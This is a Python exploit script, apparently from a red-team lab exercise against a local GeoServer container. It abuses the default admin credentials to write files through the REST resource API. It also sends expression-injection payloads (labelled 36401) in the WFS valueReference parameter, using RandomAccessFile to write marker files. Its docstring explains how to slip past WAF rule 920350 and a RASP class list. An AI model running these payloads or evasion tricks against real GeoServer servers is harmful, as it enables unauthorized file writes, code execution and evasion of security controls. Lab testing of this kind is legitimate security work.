# -*- coding: utf-8 -*-
"""Final round - GeoServer (Task 2a) second volley.

GS-7  REST feature abuse: PUT /geoserver/rest/resource/pwn_joint_rest.txt with
      admin:geoserver (default creds, verified GS-0 200) and a VALID-XML body
      (CRS-clean CT, no anomaly) -> app's own file-write API lands bytes in the
      data dir (AA-granted /mnt/geoserver/**). No exploit API fires: WAF pass,
      RASP pass (no writeFile algorithm), AA pass -> criterion (c).
GS-8  36401 eval probes with hostname Host header (kills 920350) and APIs that
      are NOT in java-classes.data (RandomAccessFile / nio.channels):
        - baseline 'foo' response shape
        - exec() minim noise control
        - new java.io.RandomAccessFile(...).write(...)
        - write(java.io.RandomAccessFile,...) receiver form
Truth = /mnt/geoserver markers + rasp logs + dmesg delta; never HTTP status.
"""
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18382"
s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
s.headers["Host"] = "evil.com"


def show(label, r):
    txt = r.text
    if len(txt) > 200:
        txt = txt[:100] + "...[" + str(len(txt)) + "B]..." + txt[-80:]
    print("[*] %-46s HTTP %s | %s" % (label, r.status_code, txt.replace("\n", " ")[:190]))


def truth():
    out = subprocess.run(["docker", "exec", "multi-round-lab-geoserver-1", "sh", "-c",
                          "ls -l --full-time /mnt/geoserver/pwn_joint_* /mnt/geoserver/data_dir/pwn_joint_* 2>/dev/null"],
                         capture_output=True, text=True, errors="replace")
    print("[truth]", (out.stdout + out.stderr).strip() or "(no markers)")
    out = subprocess.run(["docker", "logs", "multi-round-lab-geoserver-1", "--since", "3m"],
                         capture_output=True, text=True, errors="replace")
    for line in (out.stdout + out.stderr).splitlines():
        low = line.lower()
        if "blocked" in low or "attack" in low:
            print("[rasp]", line.strip()[:200])


print("=== GS-7: REST resource PUT (feature abuse) ===")
r = s.put(BASE + "/geoserver/rest/resource/pwn_joint_rest.txt",
          data="<pwn>rest-write</pwn>",
          headers={"Content-Type": "application/xml"},
          auth=("admin", "geoserver"), timeout=60)
show("PUT resource pwn_joint_rest.txt", r)
time.sleep(2)
truth()

print("\n=== GS-8: eval probes (hostname Host, non-listed classes) ===")
cases = [
    ("probe-baseline 'foo'", "foo"),
    ("probe exec(1,2)", "exec(1,2)"),
    ("RandomAccessFile ctor+write", "write(new java.io.RandomAccessFile('/mnt/geoserver/pwn_joint_gs3','rw'),'pwn3'.getBytes())"),
    ("RandomAccessFile receiver form", "new java.io.RandomAccessFile('/mnt/geoserver/pwn_joint_gs4','rw').write('pwn4'.getBytes())"),
]
for label, v in cases:
    r = s.get(BASE + "/geoserver/ows", params={
        "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
        "typeNames": "sf:archsites", "valueReference": v}, timeout=90)
    show(label, r)

time.sleep(2)
truth()
